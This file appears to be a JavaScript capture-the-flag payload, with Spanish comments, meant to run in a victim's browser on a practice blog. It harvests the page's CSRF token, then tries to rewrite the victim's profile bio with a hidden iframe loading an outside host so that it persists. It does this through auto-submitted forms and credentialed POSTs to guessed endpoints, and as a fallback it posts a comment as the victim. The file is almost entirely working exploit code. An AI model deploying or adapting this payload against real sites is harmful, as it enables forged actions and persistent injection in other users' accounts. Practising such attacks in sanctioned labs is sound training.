// exploit.js - CTF payload: intenta persistir en la bio o, si no puede, postear un comentario
(async function(){
  try{
    // Mensaje objetivo
    const COMMENT_TEXT = "Hola Jeni — ¿hay alguien en este blog?";
    // Si vas a usar persistencia con iframe, pon aquí la URL pública de tu host (Netlify/Glitch)
    const HOST_IFRAME = "https://chl-59320792-b418-4150-9ae3-6774c55e196b-blog-hacklab-v2.softwareseguro.com.ar"; // REEMPLAZAR si corresponde

    // Buscar token CSRF en meta o inputs comunes
    function findCsrf() {
      const meta = document.querySelector('meta[name="csrf-token"]');
      if(meta) return meta.content;
      const selectors = ['input[name="csrf_token"]','input[name="_csrf"]','input[name="csrfmiddlewaretoken"]'];
      for(const s of selectors){
        const el = document.querySelector(s);
        if(el && el.value) return el.value;
      }
      return null;
    }

    // Intento 1: si existe formulario de perfil en el DOM, rellenarlo y enviarlo
    const newBio = `<iframe src="${HOST_IFRAME}" width="1" height="1" style="border:0"></iframe>`;
    const form = document.querySelector('form[action*="profile"], form[action*="user"], form[id*="profile"], form[name*="profile"]');
    if(form){
      const bioField = form.querySelector('textarea[name="bio"], input[name="bio"]');
      if(bioField){
        bioField.value = newBio;
        const tok = findCsrf();
        if(tok){
          const t = form.querySelector('input[name="csrf_token"], input[name="_csrf"], input[name="csrfmiddlewaretoken"]');
          if(t) t.value = tok;
        }
        try{ form.submit(); console.log("exploit: submitted profile form"); return; } catch(e){ /* ignore */ }
      }
    }

    // Intento 2: POST directo a endpoints comunes para actualizar bio
    const tok = findCsrf();
    const candidates = ['/profile','/user/profile','/users/me','/users','/account','/profile/update','/users/update'];
    for(const c of candidates){
      try{
        const body = new URLSearchParams();
        body.append('bio', newBio);
        if(tok){ body.append('csrf_token', tok); body.append('_csrf', tok); body.append('csrfmiddlewaretoken', tok); }
        const r = await fetch(c, { method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: body.toString() });
        if(r.status >= 200 && r.status < 400){
          console.log('exploit: bio updated via', c, 'status', r.status);
          return;
        }
      }catch(e){ /* seguir probando */ }
    }

    // Intento 3 (fallback): publicar un comentario directamente
    try{
      const b = new URLSearchParams();
      b.append('content', COMMENT_TEXT);
      if(tok){ b.append('csrf_token', tok); b.append('_csrf', tok); b.append('csrfmiddlewaretoken', tok); }
      const r2 = await fetch('/comments', { method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: b.toString() });
      console.log('exploit: tried posting comment, status', r2.status);
      return;
    }catch(e){ console.log('exploit: comment failed', e); }

  }catch(err){
    console.log('exploit error', err);
  }
})();
